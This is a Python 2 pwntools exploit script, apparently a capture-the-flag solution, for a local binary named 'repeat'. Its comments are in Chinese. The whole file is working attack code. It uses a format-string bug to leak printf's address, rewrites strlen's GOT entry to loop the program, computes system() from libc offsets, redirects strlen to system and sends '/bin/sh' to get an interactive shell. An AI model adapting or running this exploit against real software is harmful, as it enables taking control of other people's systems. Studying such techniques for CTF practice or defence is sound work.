#!/usr/bin/env python2
from pwn import *
import struct
# 初始化变量
r_program = process('./repeat')
program = ELF('repeat')
libc = ELF('libc.so.6')

strlen_got = program.got['strlen']

system_program = 0
system_libc = libc.symbols['system']

printf_got = program.got['printf']
printf_program = 0
printf_libc = libc.symbols['printf']

#read函数前，为了重复调用printf
run_address = 0x080485b1

#先读取前言
r_program.recvrepeat(timeout=1)


#构造exp 作用1：获取printf函数地址 作用2：把strcpy的got表地址修改为run_address
exp = ''
exp += struct.pack('<i', printf_got)
exp += struct.pack('<i', strlen_got)
exp += '[%4$.4s]'
exp += struct.pack('<i', strlen_got + 2)
a = run_address % 0x10000
exp += '%' + str(a - 18) +'c%5$hn'
b = 0xffff - a + run_address // 0x10000 + 1
exp += '%' + str(b) +'c%8$hn'

#发送数据
r_program.sendline(exp)

#读取printf函数地址
address_text = r_program.recvrepeat(timeout=5)
text_left = address_text.find('[') + 1
text_right = address_text.find(']')
address_text = address_text[text_left : text_right]
print(repr(address_text))

printf_program = struct.unpack('<i', address_text)[0]
print(hex(printf_program))

#计算system函数地址
system_program = system_libc - printf_libc + printf_program

#构造exp 将strlen的地址写为system的地址
exp = ''
exp += '/bin/sh;'
exp += struct.pack('<i', strlen_got)
exp += struct.pack('<i', strlen_got + 2)
a = system_program % 0x10000
exp += '%' + str(a - 16) +'c%11$hn'
b = 0xffff - a + system_program // 0x10000 + 1
exp += '%' + str(b) +'c%12$hn\x00'

#发送数据
r_program.sendline(exp)

#获取回复
print(repr(r_program.recvrepeat(timeout=10)))
print(hex(system_program))

#获取shell
r_program.interactive()
